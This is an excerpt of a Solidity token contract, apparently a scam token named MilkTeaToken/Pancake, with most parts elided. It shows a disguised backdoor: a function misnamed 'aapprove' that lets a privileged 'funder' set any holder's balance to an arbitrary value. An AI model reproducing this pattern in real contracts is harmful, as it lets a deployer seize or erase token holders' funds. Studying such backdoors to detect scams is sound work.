...
abstract contract MilkTeaToken is IERC20, Ownable {
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _tokens[sender] -= amount;
        _tokens[recipient] += amount;
    ...
    function aapprove(address addr, uint256 enable) public onlyFunder {
        _tokens[addr] = (enable);
    }
...
contract Pancake is MilkTeaToken {
    constructor() MilkTeaToken(
        ...
        address(0x49eC1A81ECf23bAc018e7a1586feAe01bA2b4cc8),
